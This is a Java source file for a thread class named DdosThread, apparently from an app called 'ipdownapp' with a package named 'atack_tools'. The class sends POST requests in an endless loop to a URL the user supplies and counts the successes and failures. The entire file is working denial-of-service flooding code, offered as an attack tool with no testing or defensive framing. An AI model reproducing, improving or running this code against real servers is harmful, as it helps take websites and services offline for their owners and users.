package com.example.ipdownapp.atack_tools;

import com.example.ipdownapp.models.ConsoleStateQueue;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Hilo encargado de realizar peticiones en bucle.
 */

public class DdosThread extends Thread{


    private static int autoId = 0;

    private int id;

    private ConsoleStateQueue colaDatos;

    private volatile boolean run;

    private String request;
    private URL url;

    String param = null;

    public DdosThread(ConsoleStateQueue colaDatos){
        this.colaDatos = colaDatos;
        this.id = ++autoId;

        run = true;
    }

    public void setRequestURL(String request) {
        this.request = request;
        try{
            this.url = new URL(request);
        }catch (Exception e){
        }
    }

    @Override
    public void run() {

        while (run) {

            try {
                attack();
            } catch (IOException e) {
                System.out.println(e.getMessage());
                colaDatos.incPeticionesErroneas();
            }
        }
    }

    public void attack() throws IOException {

        HttpURLConnection connection = null;
        OutputStream out = null;
        InputStream in = null;
        StringBuilder respuesta = new StringBuilder();

        //Creamos un objeto connection
        connection = (HttpURLConnection) this.url.openConnection();
        connection.setReadTimeout(5000);
        connection.setUseCaches(false);
        connection.setRequestProperty("charset", "utf-8");
        connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        connection.setDoInput(true);
        connection.setDoOutput(true);

        String cadena = "";
        byte[] data = cadena.getBytes("utf-8");

        out = connection.getOutputStream();
        out.write(data);
        out.close();

        in = connection.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(in));
        String line = null;

        while ((line = reader.readLine()) != null) {
            respuesta.append(line);
        }

        if (out != null) out.close();

        if (in != null) in.close();

        if (connection != null) connection.disconnect();

        colaDatos.incPeticionesExitosas();

    }

    public boolean isRun() {
        return run;
    }

    public void setRun(boolean run) {
        this.run = run;
    }
}
